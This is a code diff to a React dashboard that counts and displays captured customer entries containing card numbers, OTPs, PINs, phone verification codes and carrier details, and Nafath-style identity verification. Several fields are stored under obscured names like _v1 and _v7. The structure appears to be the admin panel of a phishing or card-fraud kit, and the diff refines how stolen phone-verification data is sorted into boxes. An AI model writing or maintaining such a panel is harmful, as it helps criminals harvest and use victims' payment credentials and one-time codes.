@@ -325,7 +325,7 @@ export default function DashboardPage() {
       return date.getDate() === nowDate.getDate() && date.getMonth() === nowDate.getMonth() && date.getFullYear() === nowDate.getFullYear();
     }).length;
     const cardCount = uniqueCustomerRequests.filter((request) => Boolean(request.hasCard || request.raw?._v1 || request.raw?.cardNumber || request.raw?.paymentStatus)).length;
-    const phoneCount = uniqueCustomerRequests.filter((request) => Boolean(request.raw?.phoneNumber || request.raw?.phoneIdNumber || request.raw?.phoneOtpStatus || request.raw?.phoneCarrier)).length;
+    const phoneCount = uniqueCustomerRequests.filter((request) => Boolean(request.raw?.phoneIdNumber || request.raw?.phoneOtpStatus || request.raw?.phoneCarrier || request.raw?._v7)).length;
 
     return {
       totalEntries,
@@ -695,7 +695,8 @@ export default function DashboardPage() {
         
         switch (dataType) {
           case 'phone':
-            if (raw.phoneNumber || raw.mobileNumber || raw.phoneIdNumber) return raw;
+            // Only return if there's actual phone verification data (from step5), not just phoneNumber
+            if (raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7) return raw;
             break;
           case 'card':
             if (raw._v1 || raw._v2 || raw._v3 || raw._v5 || raw.cardNumber || raw.paymentStatus || raw.hasCard) return raw;
@@ -2574,10 +2575,12 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each entry that has Phone data
+    // Create a box for each entry that has Phone verification data (from step5)
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
-      const hasPhone = raw.phoneNumber || raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
+      // Only show phone verification box if there's actual verification data (from step5)
+      // NOT just phoneNumber which is in basic info
+      const hasPhoneVerification = raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
       
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 4;
@@ -2594,8 +2597,8 @@ const renderNafadBox = () => {
       const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
-      // Check if this entry has phone data
-      if (!hasPhone) return;
+      // Check if this entry has phone verification data (from step5)
+      if (!hasPhoneVerification) return;
       
       boxes.push({
         key: `phone-${entry.id}`,
